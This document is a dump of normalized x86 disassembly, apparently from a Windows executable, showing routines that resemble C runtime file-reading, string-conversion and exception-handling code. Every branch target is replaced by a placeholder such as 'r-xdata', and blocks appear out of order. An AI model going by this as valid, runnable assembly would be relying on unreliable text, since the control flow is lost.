mov eax [ eax ]
mov [ esi ] eax
mov eax [ ebp - 0x4 ]
mov al [ eax ]
mov [ esi + 0x4 ] al
push 0xfa0
lea eax [ esi + 0xc ]
push eax
call [ InitializeCriticalSectionAndSpinCount@IAT ]
test eax eax
je r-xdata
push eax
call [ GetFileType@IAT ]
test eax eax
je r-xdata
pop edi
pop ebx
inc [ esi + 0x8 ]
sub_40bf12
mov edi edi
push ebp
mov ebp esp
sub esp 0x1c
mov edx [ ebp + 0x10 ]
push esi
mov esi [ ebp + 0x8 ]
push 0xfffffffe
pop eax
mov [ ebp - 0x14 ] eax
mov [ ebp - 0x1c ] edx
cmp esi eax
jne r-xdata
push ebx
xor ebx ebx
cmp esi ebx
jl r-xdata
call sub_406d2b
and [ eax ] 0x0
call sub_40f84f
mov [ eax ] 0x9
or eax 0xffffffff
jmp r-xdata
call sub_406d2b
mov [ eax ] ebx
call sub_40f84f
mov [ eax ] 0x9
call sub_40c515
or eax 0xffffffff
jmp r-xdata
cmp esi [ rw-data ]
jb r-xdata
pop esi
leave
retn
pop ebx
mov eax esi
sar eax 0x5
push edi
and esi 0x1f
lea edi [ eax * 4 + rw-data ]
mov eax [ edi ]
shl esi 0x6
mov cl [ eax + esi + 0x4 ]
test cl 0x1
jne r-xdata
cmp edx 0x7fffffff
ja r-xdata
call sub_406d2b
mov [ eax ] ebx
call sub_40f84f
mov [ eax ] 0x9
jmp r-xdata
call sub_406d2b
mov [ eax ] ebx
call sub_40f84f
mov [ eax ] 0x16
mov [ ebp - 0xc ] ebx
cmp edx ebx
je r-xdata
call sub_40c515
jmp r-xdata
or eax 0xffffffff
jmp r-xdata
xor eax eax
test cl 0x2
jne r-xdata
pop edi
cmp [ ebp + 0xc ] ebx
je r-xdata
mov al [ eax + esi + 0x24 ]
add al al
sar al 0x1
mov [ ebp - 0x2 ] al
movsx eax al
dec eax
push 0x4
pop ecx
je r-xdata
mov eax edx
not eax
test al 0x1
jne r-xdata
dec eax
jne r-xdata
mov eax edx
shr eax 0x1
mov [ ebp + 0x10 ] ecx
cmp eax ecx
jb r-xdata
mov ebx [ ebp + 0xc ]
mov [ ebp - 0x10 ] ebx
jmp r-xdata
mov eax edx
not eax
test al 0x1
je r-xdata
push [ ebp + 0x10 ]
call sub_402a4b
mov ebx eax
pop ecx
mov [ ebp - 0x10 ] ebx
test ebx ebx
jne r-xdata
mov [ ebp + 0x10 ] eax
mov ecx [ edi ]
add ecx esi
test [ ecx + 0x4 ] 0x48
mov eax ebx
je r-xdata
and edx 0xfffffffe
mov [ ebp + 0x10 ] edx
push 0x1
push 0x0
push 0x0
push [ ebp + 0x8 ]
call sub_401b7b
mov ecx [ edi ]
mov [ esi + ecx + 0x28 ] eax
add esp 0x10
mov [ esi + ecx + 0x2c ] edx
call sub_40f84f
mov [ eax ] 0xc
call sub_406d2b
mov [ eax ] 0x8
push 0x0
lea ecx [ ebp - 0x18 ]
push ecx
push [ ebp + 0x10 ]
push eax
mov eax [ edi ]
push [ esi + eax ]
call [ ReadFile@IAT ]
test eax eax
je r-xdata
mov cl [ ecx + 0x5 ]
cmp cl 0xa
je r-xdata
call [ GetLastError@IAT ]
push 0x5
pop esi
cmp eax esi
jne r-xdata
mov ecx [ ebp - 0x18 ]
test ecx ecx
js r-xdata
cmp [ ebp + 0x10 ] 0x0
je r-xdata
cmp eax 0x6d
jne r-xdata
call sub_40f84f
mov [ eax ] 0x9
call sub_406d2b
mov [ eax ] esi
jmp r-xdata
cmp ecx [ ebp + 0x10 ]
ja r-xdata
dec [ ebp + 0x10 ]
cmp [ ebp - 0x2 ] 0x0
mov [ ebx ] cl
mov ecx [ edi ]
lea eax [ ebx + 0x1 ]
mov [ ebp - 0xc ] 0x1
mov [ esi + ecx + 0x5 ] 0xa
je r-xdata
push eax
call sub_401085
pop ecx
and [ ebp - 0x14 ] 0x0
jmp r-xdata
or [ ebp - 0x14 ] 0xffffffff
mov eax [ edi ]
add [ ebp - 0xc ] ecx
lea eax [ esi + eax + 0x4 ]
test [ eax ] 0x80
je r-xdata
mov ecx [ edi ]
mov cl [ esi + ecx + 0x25 ]
cmp cl 0xa
je r-xdata
mov eax [ ebp - 0x14 ]
cmp eax 0xfffffffe
jne r-xdata
push eax
call sub_40ab76
pop ecx
mov eax [ ebp - 0x10 ]
cmp eax [ ebp + 0xc ]
je r-xdata
cmp [ ebp - 0x2 ] 0x2
je r-xdata
cmp [ ebp + 0x10 ] 0x0
je r-xdata
mov eax [ ebp - 0xc ]
jmp r-xdata
test ecx ecx
je r-xdata
test ecx ecx
je r-xdata
mov [ eax ] cl
mov ecx [ edi ]
inc eax
dec [ ebp + 0x10 ]
cmp [ ebp - 0x2 ] 0x1
mov [ ebp - 0xc ] 0x2
mov [ esi + ecx + 0x25 ] 0xa
jne r-xdata
and [ eax ] 0xfb
cmp [ ebx ] 0xa
jne r-xdata
and [ eax ] 0xfb
cmp [ ebx ] 0xa
jne r-xdata
mov ecx [ edi ]
mov cl [ esi + ecx + 0x26 ]
cmp cl 0xa
je r-xdata
sub ebx [ ebp - 0x10 ]
mov [ ebp - 0xc ] ebx
jmp r-xdata
mov eax [ ebp + 0x10 ]
movzx ecx [ eax ]
cmp ecx 0x1a
je r-xdata
or [ eax ] 0x4
jmp r-xdata
mov eax ebx
sub eax [ ebp - 0x10 ]
cmp [ ebp - 0x2 ] 0x1
mov [ ebp - 0xc ] eax
jne r-xdata
mov ecx [ ebp + 0x10 ]
mov al [ ecx ]
cmp al 0x1a
je r-xdata
or [ eax ] 0x4
jmp r-xdata
cmp [ ebp + 0x10 ] 0x0
je r-xdata
mov ecx [ edi ]
lea esi [ esi + ecx + 0x4 ]
test [ esi ] 0x40
jne r-xdata
cmp ecx 0xd
je r-xdata
mov ebx [ ebp - 0x10 ]
mov eax [ ebp - 0xc ]
add eax ebx
mov [ ebp + 0x10 ] ebx
mov [ ebp - 0xc ] eax
cmp ebx eax
jae r-xdata
test eax eax
je r-xdata
mov eax [ edi ]
lea eax [ esi + eax + 0x4 ]
test [ eax ] 0x40
jne r-xdata
cmp al 0xd
je r-xdata
mov ebx [ ebp - 0x10 ]
mov eax [ ebp - 0xc ]
add eax ebx
mov [ ebp + 0x10 ] ebx
mov [ ebp - 0xc ] eax
cmp ebx eax
jae r-xdata
mov [ eax ] cl
mov ecx [ edi ]
inc eax
dec [ ebp + 0x10 ]
mov [ ebp - 0xc ] 0x3
mov [ esi + ecx + 0x26 ] 0xa
mov ax [ eax ]
mov [ ebx ] ax
add ebx 0x2
or [ esi ] 0x2
jmp r-xdata
mov ecx [ ebp - 0xc ]
add ecx 0xfffffffe
cmp eax ecx
jae r-xdata
mov [ ebx ] cx
add ebx 0x2
add eax 0x2
mov [ ebp + 0x10 ] eax
jmp r-xdata
dec ebx
mov cl [ ebx ]
test cl cl
js r-xdata
mov al [ ecx ]
mov [ ebx ] al
inc ebx
or [ eax ] 0x2
jmp r-xdata
mov eax [ ebp - 0xc ]
dec eax
cmp ecx eax
jae r-xdata
mov [ ebx ] al
inc ebx
inc ecx
mov [ ebp + 0x10 ] ecx
jmp r-xdata
add [ ebp + 0x10 ] 0x2
push 0x0
lea eax [ ebp - 0x18 ]
push eax
push 0x2
lea eax [ ebp - 0x8 ]
push eax
mov eax [ edi ]
push [ esi + eax ]
call [ ReadFile@IAT ]
test eax eax
jne r-xdata
lea ecx [ eax + 0x2 ]
cmp [ ecx ] 0xa
jne r-xdata
mov eax [ ebp - 0xc ]
cmp [ ebp + 0x10 ] eax
jb r-xdata
xor eax eax
inc eax
movzx ecx cl
jmp r-xdata
inc ebx
jmp r-xdata
inc [ ebp + 0x10 ]
push 0x0
lea eax [ ebp - 0x18 ]
push eax
push 0x1
lea eax [ ebp - 0x1 ]
push eax
mov eax [ edi ]
push [ esi + eax ]
call [ ReadFile@IAT ]
test eax eax
jne r-xdata
lea eax [ ecx + 0x1 ]
cmp [ eax ] 0xa
jne r-xdata
mov eax [ ebp - 0xc ]
cmp [ ebp + 0x10 ] eax
jb r-xdata
cmp [ ebp - 0x18 ] 0x0
je r-xdata
call [ GetLastError@IAT ]
test eax eax
jne r-xdata
mov [ ebp + 0x10 ] ecx
jmp r-xdata
add eax 0x4
mov [ ebp + 0x10 ] eax
jmp r-xdata
cmp [ ecx + rw-data ] 0x0
je r-xdata
mov eax [ ebp - 0x1c ]
sub ebx [ ebp - 0x10 ]
shr eax 0x1
push eax
push [ ebp + 0xc ]
push ebx
push [ ebp - 0x10 ]
push 0x0
push 0xfde9
call [ MultiByteToWideChar@IAT ]
mov [ ebp - 0xc ] eax
test eax eax
jne r-xdata
cmp [ ebp - 0x18 ] 0x0
je r-xdata
call [ GetLastError@IAT ]
test eax eax
jne r-xdata
mov [ ebp + 0x10 ] eax
jmp r-xdata
add ecx 0x2
mov [ ebp + 0x10 ] ecx
jmp r-xdata
push 0xd
mov eax [ edi ]
test [ esi + eax + 0x4 ] 0x48
je r-xdata
pop eax
mov [ ebx ] ax
cmp eax 0x4
jg r-xdata
mov dl [ ebx ]
movzx ecx dl
movsx ecx [ ecx + rw-data ]
test ecx ecx
jne r-xdata
mov eax [ ebp - 0xc ]
mov edx [ edi ]
xor ecx ecx
cmp eax ebx
setne cl
add eax eax
mov [ ebp - 0xc ] eax
mov [ esi + edx + 0x30 ] ecx
jmp r-xdata
call [ GetLastError@IAT ]
mov [ ebx ] 0xd
mov eax [ edi ]
test [ esi + eax + 0x4 ] 0x48
je r-xdata
inc ebx
cmp ebx [ ebp - 0x10 ]
jne r-xdata
cmp [ ebp - 0x8 ] 0xa
je r-xdata
cmp ebx [ ebp - 0x10 ]
jb r-xdata
inc ecx
cmp ecx eax
jne r-xdata
call sub_40f84f
mov [ eax ] 0x2a
jmp r-xdata
cmp ebx [ ebp - 0x10 ]
jne r-xdata
cmp [ ebp - 0x1 ] 0xa
je r-xdata
push 0x1
push 0xffffffff
push 0xfffffffe
push [ ebp + 0x8 ]
call sub_401b7b
add esp 0x10
cmp [ ebp - 0x8 ] 0xa
je r-xdata
cmp [ ebp - 0x8 ] 0xa
je r-xdata
push 0xa
jmp r-xdata
push 0xd
pop eax
mov [ ebx ] ax
mov eax [ edi ]
mov cl [ ebp - 0x8 ]
mov [ esi + eax + 0x5 ] cl
mov eax [ edi ]
mov cl [ ebp - 0x7 ]
mov [ esi + eax + 0x25 ] cl
mov eax [ edi ]
mov [ esi + eax + 0x26 ] 0xa
jmp r-xdata
dec ebx
movzx ecx [ ebx ]
inc eax
mov ecx [ edi ]
test [ ecx + esi + 0x4 ] 0x48
je r-xdata
add ebx eax
jmp r-xdata
push 0x1
push 0xffffffff
push 0xffffffff
push [ ebp + 0x8 ]
call sub_401b7b
add esp 0x10
cmp [ ebp - 0x1 ] 0xa
je r-xdata
cmp [ ebp - 0x1 ] 0xa
je r-xdata
mov [ ebx ] 0xa
jmp r-xdata
mov [ ebx ] 0xd
mov eax [ edi ]
mov cl [ ebp - 0x1 ]
mov [ esi + eax + 0x5 ] cl
jmp r-xdata
add ebx 0x2
neg eax
cdq
push 0x1
push edx
push eax
push [ ebp + 0x8 ]
call sub_401b7b
add esp 0x10
inc ebx
mov [ ecx + esi + 0x5 ] dl
cmp eax 0x2
jl r-xdata
cmp eax 0x3
jne r-xdata
mov dl [ ebx ]
mov ecx [ edi ]
mov [ esi + ecx + 0x25 ] dl
inc ebx
sub ebx eax
jmp r-xdata
mov dl [ ebx ]
mov ecx [ edi ]
mov [ esi + ecx + 0x26 ] dl
inc ebx
sub_40c4dc
push 0x3
call sub_406909
pop ecx
cmp eax 0x1
je r-xdata
push 0xfc
call sub_407a4a
push 0xff
call sub_407a4a
pop ecx
pop ecx
push 0x3
call sub_406909
pop ecx
test eax eax
jne r-xdata
retn
cmp [ rw-data ] 0x1
jne r-xdata
sub_40c525
push ebp
mov ebp esp
sub esp 0x8
push ebx
push esi
push edi
cld
mov [ ebp - 0x4 ] eax
xor eax eax
push eax
push eax
push eax
push [ ebp - 0x4 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_402611
add esp 0x20
mov [ ebp - 0x8 ] eax
pop edi
pop esi
pop ebx
mov eax [ ebp - 0x8 ]
mov esp ebp
pop ebp
retn
sub_40c580
mov edi edi
push ebp
mov ebp esp
push 0xfffffffe
push r--data
push sub_4104c0
mov eax [ fs : 0x0 ]
push eax
sub esp 0x18
mov eax [ rw-data ]
xor [ ebp - 0x8 ] eax
xor eax ebp
mov [ ebp - 0x1c ] eax
push ebx
push esi
push edi
push eax
lea eax [ ebp - 0x10 ]
mov [ fs : 0x0 ] eax
mov [ ebp - 0x18 ] esp
mov esi [ ebp + 0x8 ]
test esi esi
jne r-xdata
push esi
call [ lstrlenA@IAT ]
lea edi [ eax + 0x1 ]
mov [ ebp - 0x20 ] edi
push 0x0
push 0x0
push edi
push esi
push 0x0
push 0x0
call [ MultiByteToWideChar@IAT ]
mov esi eax
mov [ ebp - 0x28 ] esi
test esi esi
jne r-xdata
xor eax eax
jmp r-xdata
mov [ ebp - 0x4 ] 0x0
lea eax [ esi + esi ]
cmp esi 0x1000
jge r-xdata
call [ GetLastError@IAT ]
test eax eax
jle r-xdata
lea esp [ ebp - 0x38 ]
mov ecx [ ebp - 0x10 ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x1c ]
xor ecx ebp
call sub_401400
mov esp ebp
pop ebp
retn 0x4
push eax
call sub_40381b
add esp 0x4
mov ebx eax
mov [ ebp - 0x24 ] ebx
mov [ ebp - 0x4 ] 0xfffffffe
jmp r-xdata
call sub_413d10
mov [ ebp - 0x18 ] esp
mov eax esp
mov ebx eax
mov [ ebp - 0x24 ] ebx
mov [ ebp - 0x4 ] 0xfffffffe
jmp r-xdata
push eax
call sub_40b3f0
and eax 0xffff
or eax 0x80070000
test ebx ebx
jne r-xdata
push esi
push ebx
push edi
mov ecx [ ebp + 0x8 ]
push ecx
push 0x0
push 0x0
call [ MultiByteToWideChar@IAT ]
test eax eax
jne r-xdata
push 0x8007000e
call sub_40b3f0
push ebx
call [ SysAllocString@IAT ]
mov edi eax
cmp esi 0x1000
jl r-xdata
cmp esi 0x1000
jl r-xdata
test edi edi
jne r-xdata
push ebx
call sub_40ab76
add esp 0x4
call [ GetLastError@IAT ]
test eax eax
jle r-xdata
push ebx
call sub_40ab76
add esp 0x4
mov eax edi
push 0x8007000e
call sub_40b3f0
push eax
call sub_40b3f0
and eax 0xffff
or eax 0x80070000
sub_40c700
lea ecx [ eax + eax * 2 ]
lea ecx [ ecx * 4 + r--data ]
xor eax eax
cmp [ ecx + 0x4 ] eax
jbe r-xdata
mov eax [ ecx + 0x4 ]
xor ecx ecx
mov [ edx + eax * 2 ] cx
retn
push esi
push edi
mov esi [ ecx ]
movsx esi [ esi + eax ]
movzx edi [ ecx + 0x8 ]
xor si di
xor si ax
mov edi 0xff
and si di
mov [ edx + eax * 2 ] si
inc eax
cmp eax [ ecx + 0x4 ]
jb r-xdata
pop edi
pop esi
sub_40c741
mov edi edi
push ebp
mov ebp esp
push esi
call sub_404bc8
mov esi eax
test esi esi
je r-xdata
pop esi
pop ebp
retn
mov ecx [ esi + 0x5c ]
mov edx [ ebp + 0x8 ]
mov eax ecx
push edi
add ecx 0x90
cmp eax ecx
jae r-xdata
add eax 0xc
lea edi [ ecx + 0x90 ]
cmp eax edi
jb r-xdata
xor eax eax
cmp [ eax ] edx
je r-xdata
cmp [ eax ] edx
je r-xdata
xor eax eax
jmp r-xdata
mov edx [ eax + 0x8 ]
test edx edx
jne r-xdata
test eax eax
je r-xdata
pop edi
cmp edx 0x5
jne r-xdata
cmp edx 0x1
je r-xdata
and [ eax + 0x8 ] 0x0
xor eax eax
inc eax
jmp r-xdata
or eax 0xffffffff
mov ecx [ ebp + 0xc ]
push ebx
mov ebx [ esi + 0x60 ]
mov [ esi + 0x60 ] ecx
mov ecx [ eax + 0x4 ]
cmp ecx 0x8
jne r-xdata
and [ eax + 0x8 ] 0x0
push ecx
call edx
push 0x24
pop ecx
mov edi [ esi + 0x5c ]
and [ ecx + edi + 0x8 ] 0x0
add ecx 0xc
cmp ecx 0x90
jl r-xdata
mov eax [ eax ]
mov edi [ esi + 0x64 ]
cmp eax 0xc000008e
jne r-xdata
cmp eax 0xc0000090
jne r-xdata
mov [ esi + 0x64 ] 0x83
jmp r-xdata
cmp eax 0xc0000091
jne r-xdata
mov [ esi + 0x64 ] 0x81
jmp r-xdata
push [ esi + 0x64 ]
push 0x8
call edx
pop ecx
mov [ esi + 0x64 ] edi
jmp r-xdata
cmp eax 0xc0000093
jne r-xdata
mov [ esi + 0x64 ] 0x84
jmp r-xdata
pop ecx
mov [ esi + 0x60 ] ebx
pop ebx
cmp eax 0xc000008d
jne r-xdata
mov [ esi + 0x64 ] 0x85
jmp r-xdata
cmp eax 0xc000008f
jne r-xdata
mov [ esi + 0x64 ] 0x82
jmp r-xdata
cmp eax 0xc0000092
jne r-xdata
mov [ esi + 0x64 ] 0x86
jmp r-xdata
cmp eax 0xc00002b5
jne r-xdata
mov [ esi + 0x64 ] 0x8a
jmp r-xdata
cmp eax 0xc00002b4
jne r-xdata
mov [ esi + 0x64 ] 0x8d
jmp r-xdata
mov [ esi + 0x64 ] 0x8e
sub_40c88b
mov edi edi
push ebp
mov ebp esp
push esi
push edi
mov edi [ ebp + 0x8 ]
mov eax [ edi + 0x4 ]
test eax eax
je r-xdata
xor eax eax
inc eax
lea edx [ eax + 0x8 ]
cmp [ edx ] 0x0
je r-xdata
mov esi [ ebp + 0xc ]
mov ecx [ esi + 0x4 ]
cmp eax ecx
je r-xdata
test [ esi ] 0x2
je r-xdata
add ecx 0x8
push ecx
push edx
call sub_413f20
pop ecx
pop ecx
test eax eax
je r-xdata
mov eax [ ebp + 0x10 ]
mov eax [ eax ]
test al 0x1
je r-xdata
test [ edi ] 0x8
je r-xdata
xor eax eax
jmp r-xdata
test al 0x2
je r-xdata
test [ edi ] 0x1
je r-xdata
pop edi
pop esi
pop ebp
retn
test [ edi ] 0x2
je r-xdata
sub_40c8ea
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push esi
push [ ebp + 0xc ]
lea ecx [ ebp - 0x10 ]
call sub_407759
mov esi [ ebp + 0x8 ]
movsx eax [ esi ]
push eax
call sub_40ffe4
cmp eax 0x65
jmp r-xdata
pop ecx
jne r-xdata
inc esi
movzx eax [ esi ]
push eax
call sub_404ad7
test eax eax
movsx eax [ esi ]
push eax
call sub_40ffe4
pop ecx
cmp eax 0x78
jne r-xdata
mov ecx [ ebp - 0x10 ]
mov ecx [ ecx + 0xbc ]
mov ecx [ ecx ]
mov al [ esi ]
mov cl [ ecx ]
mov [ esi ] cl
inc esi
add esi 0x2
mov cl [ esi ]
mov [ esi ] al
mov al cl
mov cl [ esi ]
inc esi
test cl cl
jne r-xdata
pop esi
cmp [ ebp - 0x4 ] cl
je r-xdata
leave
retn
mov eax [ ebp - 0x8 ]
and [ eax + 0x70 ] 0xfffffffd
sub_40c9a0
push ebp
mov ebp esp
mov eax [ ecx ]
mov edx [ eax + 0x8 ]
mov [ ecx ] edx
mov edx [ eax + 0x8 ]
cmp [ edx + 0x31 ] 0x0
jne r-xdata
mov edx [ ecx + 0x4 ]
mov [ eax + 0x4 ] edx
mov edx [ ebp + 0x8 ]
mov edx [ edx + 0x4 ]
cmp ecx [ edx + 0x4 ]
jne r-xdata
mov [ edx + 0x4 ] ecx
mov edx [ ecx + 0x4 ]
cmp ecx [ edx + 0x8 ]
jne r-xdata
mov [ edx + 0x4 ] eax
mov [ eax + 0x8 ] ecx
mov [ ecx + 0x4 ] eax
pop ebp
retn 0x4
mov [ edx ] eax
mov [ eax + 0x8 ] ecx
mov [ ecx + 0x4 ] eax
pop ebp
retn 0x4
mov [ edx + 0x8 ] eax
mov [ eax + 0x8 ] ecx
mov [ ecx + 0x4 ] eax
pop ebp
retn 0x4
sub_40ca00
push ebp
mov ebp esp
sub eax ecx
push esi
sar eax 0x2
lea esi [ eax * 4 ]
mov eax [ ebp + 0x8 ]
push esi
push ecx
push eax
call sub_4138f0
add esp 0xc
add eax esi
pop esi
pop ebp
retn 0x4
sub_40ca25
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov edx eax
mov cx [ eax ]
add eax 0x2
test cx cx
jne r-xdata
mov cx [ ebp + 0xc ]
cmp [ eax ] cx
je r-xdata
cmp [ eax ] cx
jne r-xdata
pop ebp
retn
xor eax eax
sub eax 0x2
cmp eax edx
je r-xdata
sub_40ca53
mov edi edi
push ebp
mov ebp esp
mov edx [ ebp + 0x8 ]
push esi
push edi
test edx edx
je r-xdata
call sub_40f84f
push 0x16
pop esi
mov [ eax ] esi
mov edi [ ebp + 0xc ]
test edi edi
jne r-xdata
pop edi
pop esi
pop ebp
retn
mov eax [ ebp + 0x10 ]
test eax eax
jne r-xdata
mov esi edx
sub esi eax
mov [ edx ] al
jmp r-xdata
test edi edi
jne r-xdata
dec edi
jne r-xdata
xor eax eax
mov [ edx ] 0x0
call sub_40f84f
push 0x22
pop ecx
mov [ eax ] ecx
mov esi ecx
jmp r-xdata
mov cl [ eax ]
mov [ esi + eax ] cl
inc eax
test cl cl
je r-xdata
call sub_40c515
mov eax esi
jmp r-xdata
sub_40cab2
mov edi edi
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
test esi esi
jne r-xdata
push esi
call sub_40438b
pop ecx
test eax eax
je r-xdata
push esi
call sub_415d5f
pop ecx
jmp r-xdata
test [ esi + 0xc ] 0x4000
je r-xdata
or eax 0xffffffff
jmp r-xdata
pop esi
pop ebp
retn
xor eax eax
push esi
call sub_402116
push eax
call sub_40a384
pop ecx
neg eax
pop ecx
sbb eax eax
jmp r-xdata
sub_40cb11
mov edi edi
push ebp
mov ebp esp
sub esp 0x18
mov eax [ ebp + 0x10 ]
push ebx
xor ebx ebx
push esi
push edi
mov [ ebp - 0x4 ] 0x404e
mov [ eax ] ebx
mov [ eax + 0x4 ] ebx
mov [ eax + 0x8 ] ebx
cmp [ ebp + 0xc ] ebx
jbe r-xdata
cmp [ eax + 0x8 ] ebx
jne r-xdata
xor ecx ecx
mov [ ebp + 0x10 ] ebx
mov edi [ eax + 0x8 ]
test edi 0x8000
jne r-xdata
mov edx [ eax + 0x4 ]
mov [ ebp + 0x10 ] 0x1
cmp edx [ ebp - 0x18 ]
jae r-xdata
mov cx [ ebp - 0x4 ]
pop edi
pop esi
mov [ eax + 0xa ] cx
pop ebx
leave
retn
mov ecx [ eax + 0x4 ]
mov ecx [ eax ]
add [ ebp - 0x4 ] 0xfff0
mov edi edx
mov esi ecx
shr esi 0x10
shl edx 0x10
shr edi 0x10
or edx esi
shl ecx 0x10
mov [ eax + 0x4 ] edx
mov [ eax ] ecx
cmp edi ebx
je r-xdata
mov [ eax + 0x8 ] edi
mov esi [ ebp - 0x14 ]
and [ ebp + 0x10 ] 0x0
lea ebx [ edi + esi ]
cmp ebx edi
jb r-xdata
mov esi [ ebp - 0x8 ]
and [ ebp + 0x10 ] 0x0
lea edi [ esi + 0x1 ]
cmp edi esi
jb r-xdata
cmp [ ebp + 0x10 ] 0x0
mov [ eax ] edx
je r-xdata
mov ebx [ eax ]
add [ ebp - 0x4 ] 0xffff
mov esi ecx
mov edx ebx
shr esi 0x1f
add edi edi
shr edx 0x1f
add ecx ecx
or edi esi
add ebx ebx
or ecx edx
mov [ eax ] ebx
mov [ eax + 0x4 ] ecx
mov [ eax + 0x8 ] edi
test edi 0x8000
je r-xdata
mov [ ebp + 0x10 ] 0x1
cmp ebx esi
jae r-xdata
mov [ ebp + 0x10 ] 0x1
cmp edi 0x1
jae r-xdata
add ecx [ ebp - 0x10 ]
and [ ebp - 0x8 ] 0x0
mov edi ebx
add ecx ecx
mov esi edx
shr edi 0x1f
or ecx edi
shr esi 0x1f
add ebx ebx
add edx edx
or ebx esi
mov [ eax + 0x8 ] ecx
mov [ ebp - 0xc ] ecx
mov [ ebp + 0x10 ] ecx
mov ecx [ ebp + 0x8 ]
mov [ eax ] edx
mov [ eax + 0x4 ] ebx
movsx esi [ ecx ]
lea ecx [ edx + esi ]
mov [ ebp - 0x18 ] esi
cmp ecx edx
jb r-xdata
inc ecx
mov [ eax + 0x8 ] ecx
cmp [ ebp + 0x10 ] 0x0
mov [ eax + 0x4 ] ebx
je r-xdata
inc ecx
mov [ eax + 0x8 ] ecx
cmp [ ebp + 0x10 ] 0x0
mov [ eax + 0x4 ] edi
je r-xdata
mov [ ebp - 0x8 ] 0x1
cmp ecx esi
jae r-xdata
dec [ ebp + 0xc ]
mov edx [ ebp + 0x10 ]
inc [ ebp + 0x8 ]
cmp [ ebp + 0xc ] 0x0
mov [ eax + 0x4 ] ebx
mov [ eax + 0x8 ] edx
ja r-xdata
lea edx [ ebx + 0x1 ]
xor esi esi
cmp edx ebx
jb r-xdata
cmp [ ebp - 0x8 ] 0x0
mov [ eax ] ecx
je r-xdata
mov esi eax
lea edi [ ebp - 0x18 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov edx ecx
lea edi [ ecx + ecx ]
shr edx 0x1f
lea ecx [ ebx + ebx ]
or ecx edx
mov edx [ ebp + 0x10 ]
and [ ebp + 0x10 ] 0x0
mov esi ebx
mov ebx ecx
mov [ ebp - 0x8 ] edi
shr esi 0x1f
add edx edx
or edx esi
mov esi [ ebp - 0x8 ]
add ecx ecx
shr edi 0x1f
or ecx edi
mov edi ecx
mov [ ebp - 0x8 ] ecx
lea ecx [ edx + edx ]
mov edx [ ebp - 0x18 ]
add esi esi
shr ebx 0x1f
or ecx ebx
add edx esi
mov [ eax ] esi
mov [ eax + 0x4 ] edi
mov [ eax + 0x8 ] ecx
cmp edx esi
jb r-xdata
xor ebx ebx
xor esi esi
inc esi
cmp edx 0x1
jae r-xdata
mov edx [ ebp - 0xc ]
inc edx
mov [ ebp + 0x10 ] edx
mov [ eax + 0x8 ] edx
mov ebx edx
mov [ eax + 0x4 ] edx
test esi esi
je r-xdata
sub_40cd00
push ebp
mov ebp esp
sub esp 0x8
push ebx
push esi
push edi
mov esi eax
call sub_40e920
mov esi [ esi + 0x4 ]
mov [ ebp - 0x4 ] eax
mov [ ebp - 0x8 ] esi
cmp eax esi
je r-xdata
lea eax [ ebp - 0x8 ]
mov [ ebp - 0x8 ] esi
mov ecx [ eax ]
mov eax [ ebp + 0x8 ]
pop esi
mov [ eax ] ecx
pop ebx
mov esp ebp
pop ebp
retn 0x4
mov ebx [ eax + 0x1c ]
mov edx 0x10
cmp [ eax + 0x20 ] edx
jb r-xdata
lea ecx [ eax + 0xc ]
mov ecx [ eax + 0xc ]
jmp r-xdata
cmp [ edi + 0x14 ] edx
jb r-xdata
mov eax ebx
mov esi [ edi + 0x10 ]
mov eax esi
cmp esi ebx
jb r-xdata
mov edx edi
mov edx [ edi ]
jmp r-xdata
js r-xdata
cmp esi ebx
jb r-xdata
call sub_4025a0
test eax eax
jne r-xdata
mov esi [ ebp - 0x8 ]
lea eax [ ebp - 0x4 ]
mov ecx [ eax ]
mov eax [ ebp + 0x8 ]
pop esi
mov [ eax ] ecx
pop ebx
mov esp ebp
pop ebp
retn 0x4
cmp esi ebx
setne al
test eax eax
sub_40cda0
push edi
mov edi eax
mov eax [ esi + 0x10 ]
cmp eax ecx
jae r-xdata
sub eax ecx
cmp eax edi
jae r-xdata
push r--data
call sub_40eab5
test edi edi
je r-xdata
mov edi eax
mov eax esi
pop edi
retn
mov edx [ esi + 0x14 ]
push ebx
cmp edx 0x10
jb r-xdata
mov ebx esi
mov ebx [ esi ]
jmp r-xdata
mov edx esi
mov edx [ esi ]
jmp r-xdata
cmp edx 0x10
jb r-xdata
mov ecx esi
mov [ ecx + eax ] 0x0
mov ecx [ esi ]
mov [ ecx + eax ] 0x0
mov eax esi
pop edi
retn
sub eax edi
add ebx ecx
push eax
add ebx edi
add edx ecx
push ebx
push edx
call sub_4138f0
mov eax [ esi + 0x10 ]
add esp 0xc
sub eax edi
cmp [ esi + 0x14 ] 0x10
mov [ esi + 0x10 ] eax
pop ebx
jb r-xdata
sub_40ce10
mov edi edi
push ebp
mov ebp esp
push 0xfffffffe
push r--data
push sub_4104c0
mov eax [ fs : 0x0 ]
push eax
sub esp 0x8
push ebx
push esi
push edi
mov eax [ rw-data ]
xor [ ebp - 0x8 ] eax
xor eax ebp
push eax
lea eax [ ebp - 0x10 ]
mov [ fs : 0x0 ] eax
mov [ ebp - 0x18 ] esp
mov [ ebp - 0x4 ] 0x0
push __dos_header
call sub_411750
add esp 0x4
test eax eax
je r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
xor eax eax
mov ecx [ ebp - 0x10 ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp + 0x8 ]
sub eax __dos_header
push eax
push __dos_header
call sub_401000
add esp 0x8
test eax eax
je r-xdata
mov eax [ eax + 0x24 ]
shr eax 0x1f
not eax
and eax 0x1
mov [ ebp - 0x4 ] 0xfffffffe
mov ecx [ ebp - 0x10 ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_40cecc
mov edi edi
push esi
push edi
xor edi edi
push [ edi + rw-data ]
call [ EncodePointer@IAT ]
mov [ edi + rw-data ] eax
add edi 0x4
cmp edi 0x28
jb r-xdata
pop edi
pop esi
retn
sub_40cef0
push ebp
mov ebp esp
push esi
mov esi ecx
mov eax [ esi + 0x4 ]
push edi
test eax eax
je r-xdata
